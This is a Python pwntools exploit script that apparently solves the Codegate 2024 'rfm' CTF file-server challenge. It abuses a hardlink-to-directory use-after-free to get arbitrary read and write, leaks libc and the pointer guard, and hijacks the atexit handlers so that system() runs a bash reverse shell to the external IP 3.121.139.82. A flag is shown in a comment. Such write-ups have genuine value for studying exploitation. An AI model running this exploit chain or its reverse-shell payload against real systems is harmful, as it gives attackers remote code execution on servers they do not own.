#!/usr/bin/env python3
import struct
import time
from contextlib import closing, contextmanager
from dataclasses import dataclass
from typing import Optional

from pwn import *


def connect():
    if args.LOCAL:
        if args.GDB:
            server_tube = gdb.debug(["./rfm.dbg"], api=True)
            # server_tube.gdb.execute("handle SIGALRM nopass")
            server_tube.gdb.execute("set follow-fork-mode child")
            server_tube.gdb.execute("b system")
            server_tube.gdb.execute("b close")
            server_tube.gdb.continue_nowait()
        else:
            server_tube = process(["./rfm"])
        server_tube.recvuntil(b"Server is running!")
        return remote("localhost", 8811), server_tube
    else:
        return remote("3.35.170.102", 8811), open("/dev/null")


@dataclass
class Response:
    magic: int
    size: int
    body: bytes


SUCC = Response(0x99, 4, b"SUCC")
FAIL = Response(0x99, 4, b"FAIL")
PONG = Response(0x99, 4, b"PONG")


def recv_response(tube):
    magic, size = struct.unpack("<BxH", tube.recvn(4))
    return Response(magic, size, tube.recvn(size))


def msg(cmd: int, data: bytes, data_len: Optional[int] = None) -> bytes:
    if data_len is None:
        data_len = len(data)
    return struct.pack("<BxH", cmd, data_len) + data


# Make the following check happy:
# if ( !g_scratch || !g_scratch->valid || m->body_size > *(_WORD *)&g_scratch->buf[0x30] )
def wrap_scratch_data(data: bytes):
    return data.ljust(0x30, b"\x00") + struct.pack("<H", 0x7FFF)


def scratch(tube, data: bytes, data_len: Optional[int] = None):
    tube.send(msg(2, data, data_len))
    return recv_response(tube)


def upload(tube, data: bytes, data_len: Optional[int] = None):
    tube.send(msg(0, data, data_len))
    return recv_response(tube)


def cat(tube, data: bytes, data_len: Optional[int] = None):
    tube.send(msg(1, data, data_len))
    return recv_response(tube)


def mkdir(tube, data: bytes, data_len: Optional[int] = None):
    tube.send(msg(3, data, data_len))
    return recv_response(tube)


def chdir(tube, data: bytes, data_len: Optional[int] = None):
    tube.send(msg(7, data, data_len))
    return recv_response(tube)


def ln(
    tube,
    soft: bool,
    data1: bytes,
    data2: bytes,
    data_len: Optional[int] = None,
    data1_len: Optional[int] = None,
    data2_len: Optional[int] = None,
):
    if data1_len is None:
        data1_len = len(data1)
    if data2_len is None:
        data2_len = len(data2)
    data = (
        struct.pack("<BH", 1 if soft else 0, data1_len)
        + data1
        + struct.pack("<H", data2_len)
        + data2
    )
    tube.send(msg(4, data, data_len))
    return recv_response(tube)


def cp(
    tube,
    data1: bytes,
    data2: bytes,
    data_len: Optional[int] = None,
    data1_len: Optional[int] = None,
    data2_len: Optional[int] = None,
):
    if data1_len is None:
        data1_len = len(data1)
    if data2_len is None:
        data2_len = len(data2)
    data = (
        struct.pack("<H", data1_len)
        + data1
        + struct.pack("<H", data2_len)
        + data2
    )
    tube.send(msg(5, data, data_len))
    return recv_response(tube)


def rm(tube, data: bytes, data_len: Optional[int] = None):
    tube.send(msg(6, data, data_len))
    return recv_response(tube)


@dataclass
class FileInfo:
    id: int
    storage_id: int
    n_children: int
    type: int
    hole: int
    timestamp1: int
    timestamp2: int
    timestamp3: int
    data_size: int
    name_len: int
    name: bytes
    path_len: int
    path: bytes


def recv_ls_response(tube):
    response = recv_response(tube)
    file_infos = []
    body = response.body
    while len(body) != 0:
        file_info = FileInfo(*(struct.unpack("<HHIIIQQQQI48sI", body[:104]) + (b"",)))
        file_info.path = body[104 : 104 + file_info.path_len]
        body = body[104 + file_info.path_len :]
        file_infos.append(file_info)
    return response, file_infos


def ls(tube, data: bytes = b"", data_len: Optional[int] = None):
    tube.send(msg(8, data, data_len))
    return recv_ls_response(tube)


def pwd(tube, data: bytes = b"", data_len: Optional[int] = None):
    tube.send(msg(9, data, data_len))
    return recv_response(tube)


def ping(tube, data: bytes = b"PING", data_len: Optional[int] = None):
    tube.send(msg(10, data, data_len))
    return recv_response(tube)


OFFSETOF_STORAGE_DATA = 0x28
OFFSETOF_DATA_P = 0


def gdb_print_storage(tube, storage, indent=""):
    print(f"{indent}storage: 0x{int(storage):x}")
    storage_id = tube.gdb.parse_and_eval(f"*(unsigned int *)0x{int(storage) + 0:x}")
    storage_refcount = tube.gdb.parse_and_eval(
        f"*(unsigned int *)0x{int(storage) + 4:x}"
    )
    storage_timestamp1 = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x10:x}"
    )
    storage_timestamp2 = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x18:x}"
    )
    storage_timestamp3 = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x20:x}"
    )
    storage_data_p = tube.gdb.parse_and_eval(
        f"*(void **)0x{int(storage) + OFFSETOF_STORAGE_DATA + OFFSETOF_DATA_P:x}"
    )
    storage_data_size = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x30:x}"
    )
    storage_data_alloc_buf = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x38:x}"
    )
    storage_data_alloc_size = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x40:x}"
    )
    storage_next = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x48:x}"
    )
    storage_prev = tube.gdb.parse_and_eval(
        f"*(unsigned long *)0x{int(storage) + 0x50:x}"
    )
    print(f"{indent}  id: 0x{int(storage_id):x}")
    print(f"{indent}  refcount: 0x{int(storage_refcount):x}")
    print(f"{indent}  timestamp1: 0x{int(storage_timestamp1):x}")
    print(f"{indent}  timestamp2: 0x{int(storage_timestamp2):x}")
    print(f"{indent}  timestamp3: 0x{int(storage_timestamp3):x}")
    print(f"{indent}  data.p: 0x{int(storage_data_p):x}")
    print(f"{indent}  data.size: 0x{int(storage_data_size):x}")
    print(f"{indent}  data.alloc_buf: 0x{int(storage_data_alloc_buf):x}")
    print(f"{indent}  data.alloc_size: 0x{int(storage_data_alloc_size):x}")
    print(f"{indent}  next: 0x{int(storage_next):x}")
    print(f"{indent}  prev: 0x{int(storage_prev):x}")
    return storage_next


def gdb_print_nodes(tube, node, indent=""):
    print(f"{indent}node: 0x{int(node):x}")
    node_id = tube.gdb.parse_and_eval(f"*(unsigned int *)0x{int(node) + 0:x}")
    node_storage_id = tube.gdb.parse_and_eval(f"*(unsigned int *)0x{int(node) + 4:x}")
    node_n_children = tube.gdb.parse_and_eval(f"*(unsigned int *)0x{int(node) + 0xC:x}")
    node_type = tube.gdb.parse_and_eval(f"*(unsigned int *)0x{int(node) + 0x10:x}")
    node_path = tube.gdb.parse_and_eval(f"*(char **)0x{int(node) + 0x18:x}")
    node_path_str = tube.gdb.execute(
        f"x/s 0x{int(node_path):x}", to_string=True
    ).strip()
    node_name = tube.gdb.parse_and_eval(f"*(char **)0x{int(node) + 0x20:x}")
    node_scl = tube.gdb.parse_and_eval(f"*(void **)0x{int(node) + 0x28:x}")
    node_parent = tube.gdb.parse_and_eval(f"*(node **)0x{int(node) + 0x30:x}")
    node_next_sibling = tube.gdb.parse_and_eval(f"*(node **)0x{int(node) + 0x38:x}")
    node_prev_sibling = tube.gdb.parse_and_eval(f"*(node **)0x{int(node) + 0x40:x}")
    print(f"{indent}  id: {int(node_id)}")
    print(f"{indent}  storage_id: {int(node_storage_id)}")
    print(f"{indent}  n_children: {int(node_n_children)}")
    print(f"{indent}  type: {int(node_type)}")
    print(f"{indent}  path: {node_path_str}")
    print(f"{indent}  name: 0x{int(node_name):x}")
    print(f"{indent}  scl: 0x{int(node_scl):x}")
    if node_type == 0:
        gdb_print_storage(tube, node_scl, f"{indent}    ")
    print(f"{indent}  parent: 0x{int(node_parent):x}")
    print(f"{indent}  next_sibling: 0x{int(node_next_sibling):x}")
    print(f"{indent}  prev_sibling: 0x{int(node_prev_sibling):x}")
    if node_type == 1:
        print(f"{indent}  children")
        child = node_scl
        while child != 0:
            gdb_print_nodes(tube, child, f"{indent}    ")
            child_next_sibling = tube.gdb.parse_and_eval(
                f"*(node **)0x{int(child) + 0x38:x}"
            )
            child = child_next_sibling


def gdb_print_storages(tube, storage):
    while storage != 0:
        storage = gdb_print_storage(tube, storage)


def gdb_print_state(tube, server_tube):
    if not args.GDB:
        return
    server_tube.gdb.interrupt_and_wait()
    gdb_print_nodes(
        server_tube, server_tube.gdb.parse_and_eval("(struct node *)g_root")
    )
    gdb_print_storages(
        server_tube, server_tube.gdb.parse_and_eval("(struct node *)g_first_storage")
    )
    current = int(server_tube.gdb.parse_and_eval("(void *)g_current"))
    print(f"current: 0x{current:x}")
    server_tube.gdb.continue_nowait()


@contextmanager
def gdb_monitor_frees(tube):
    if not args.GDB:
        return

    class FreeBreakpoint(tube.gdb.Breakpoint):
        def __init__(self):
            super().__init__("free")

        def stop(self):
            rdi = int(tube.gdb.parse_and_eval("$rdi"))
            print(f"free(0x{rdi:x})")

    tube.gdb.interrupt_and_wait()
    bp = FreeBreakpoint()
    try:
        tube.gdb.continue_nowait()
        yield
    finally:
        tube.gdb.interrupt_and_wait()
        bp.delete()


def test(tube):
    # Upload + cat.
    assert scratch(tube, wrap_scratch_data(b"AAA")) == SUCC
    assert upload(tube, b"BBB") == SUCC
    assert cat(tube, b"AAA") == Response(0x99, 3, b"BBB")

    # Mkdir + chdir + upload + cat.
    assert mkdir(tube, b"DDD") == SUCC
    assert scratch(tube, wrap_scratch_data(b"DDD/GGG")) == FAIL
    assert chdir(tube, b"DDD") == SUCC
    assert scratch(tube, wrap_scratch_data(b"HHH")) == SUCC
    assert upload(tube, b"BBBBBB") == SUCC
    assert cat(tube, b"/DDD/HHH") == Response(0x99, 6, b"BBBBBB")

    # Hard ln + cat.
    assert chdir(tube, b"/") == SUCC
    assert ln(tube, soft=False, data1=b"/DDD/HHH", data2=b"/EEE/RRR") == SUCC
    assert cat(tube, b"/EEE/RRR") == Response(0x99, 6, b"BBBBBB")

    # Soft ln + cat.
    assert ln(tube, soft=True, data1=b"/DDD/HHH", data2=b"/EEE/VVV") == SUCC
    assert cat(tube, b"/EEE/VVV") == Response(0x99, 6, b"BBBBBB")

    # Rmdir + chdir + cat.
    assert rm(tube, b"/EEE") == SUCC
    assert chdir(tube, b"/EEE") == FAIL
    assert cat(tube, b"/EEE/RRR") == FAIL

    # Ls.
    print(ls(tube))

    # Pwd.
    assert pwd(tube) == Response(0x99, 1, b"/")

    # Ping.
    assert ping(tube) == Response(0x99, 4, b"PONG")

    # Cp + cat.
    assert cp(tube, data1=b"/DDD/HHH", data2=b"/QQQ/WWW") == SUCC
    assert cat(tube, b"/QQQ/WWW") == Response(0x99, 6, b"BBBBBB")

    print("All tests passed!")


EF_CXA = 4
LIBC_EXIT_FUNCS = 0x203680
SIZEOF_EXIT_FUNCTION_LIST = 0x30  # 1 x EF_CXA
LIBC_SYSTEM = 0x58740
LIBC_FS_BASE = -0x28C0
LIBC_POINTER_GUARD = 0x30


def main():
    tube, server_tube = connect()
    with tube, server_tube:
        if args.TEST:
            test(tube)
            tube.interactive()
            return

        t0 = time.time()

        # Bug: creating a hardlink to a directory sets the hardlink's storage
        # pointer to the directory's first child node.
        assert mkdir(tube, b"DIR") == SUCC
        assert mkdir(tube, b"DIR/DIR") == SUCC
        assert ln(tube, soft=False, data1=b"/DIR", data2=b"/LINK1") == SUCC
        # gdb_print_state(tube, server_tube)
        _, file_infos = ls(tube)
        link1_info, = [file_info for file_info in file_infos if file_info.path == b"/LINK1"]
        dir_dir_path = link1_info.timestamp2
        dir_dir_name = link1_info.timestamp3
        dir_node_addr = link1_info.data_size
        print(f"dir_dir_path = 0x{dir_dir_path:x}")
        print(f"dir_dir_name = 0x{dir_dir_name:x}")
        print(f"dir_node_addr = 0x{dir_node_addr:x}")

        # Fill Tcachebins[idx=3, size=0x50].
        for _ in range(7):
            assert ping(tube, flat({
                0: b"PING",
            }, length=0x48 - 4)) == PONG

        # Delete the child node. This makes the hardlink's storage pointer
        # point to a free chunk in Fastbins[idx=3, size=0x50] - which is
        # important, since we want to calloc() it.
        assert rm(tube, data=b"/DIR/DIR") == SUCC
        # gdb_print_state(tube, server_tube)

        # Forge struct storage.
        def do_arb_setup(addr, size):
            assert scratch(tube, wrap_scratch_data(b"FILE1")) == SUCC
            assert upload(tube, flat({
                0x28: struct.pack("<Q", addr),
                0x30: struct.pack("<H", size),
            })) == SUCC
            # gdb_print_state(tube, server_tube)

        def do_arb_read():
            return cat(tube, b"LINK1").body

        def arb_read(leak_addr, leak_size):
            do_arb_setup(leak_addr, leak_size)
            return do_arb_read()

        def arb_write(addr, data):
            do_arb_setup(addr, len(data))
            assert scratch(tube, wrap_scratch_data(b"LINK1")) == SUCC
            assert upload(tube, data) == SUCC

        do_arb_setup(dir_node_addr, 0x4000)

        # Create an unsorted chunk.
        assert mkdir(tube, b"A" * 2048) == SUCC
        assert rm(tube, b"A" * 2048) == SUCC

        # Prepare a shell command.
        assert scratch(tube, b"SHELL") == SUCC
        shell_command = b"bash -c 'bash -l > /dev/tcp/3.121.139.82/10526 0<&1 2>&1'" + b" " * 0x100
        assert upload(tube, shell_command)

        # Dump heap.
        leak = do_arb_read()
        for i in range(0, len(leak), 8):
            val, = struct.unpack("<Q", leak[i : i + 8])
            if val & 0xfff == 0xb20:
                libc = val - 0x203b20
                break
        else:
            raise RuntimeError("Could not leak libc")
        print(f"libc = 0x{libc:x}")

        shell_command_addr = dir_node_addr + leak.index(shell_command)
        print(f"shell_command_addr = 0x{shell_command_addr:x}")

        (pointer_guard,) = struct.unpack(
            "<Q", arb_read(libc + LIBC_FS_BASE + LIBC_POINTER_GUARD, 8)
        )
        print(f"pointer_guard = 0x{pointer_guard:x}")

        def ptr_mangle(addr):
            addr ^= pointer_guard
            addr = ((addr << 17) & ((1 << 64) - 1)) | (addr >> 47)
            return addr

        # Set up poisoned atexit().
        fake_exit_funcs_addr = dir_dir_path
        arb_write(
            libc + LIBC_EXIT_FUNCS,
            struct.pack("<Q", fake_exit_funcs_addr)
        )
        arb_write(
            fake_exit_funcs_addr,
            struct.pack(
                "<QQQQQ",
                0,  # exit_function_list.next
                1,  # exit_function_list.idx
                EF_CXA,  # exit_function_list.fns[0].cxa.flavor
                ptr_mangle(libc + LIBC_SYSTEM),  # exit_function_list.fns[0].cxa.fn
                shell_command_addr,  # exit_function_list.fns[0].cxa.arg
            ),
        )

        # Trigger exit(), check reverse shell.
        # cat /flag
        # codegate2024{98fda82bbc37b9d02f9cfdb95cbb17fac06cc63fd8ed1cb221c147acdad72f88a821088f29f02f2c3a2e010e82ae8574f7b677bf6d}
        tube.close()
        time.sleep(1000)


if __name__ == "__main__":
    main()
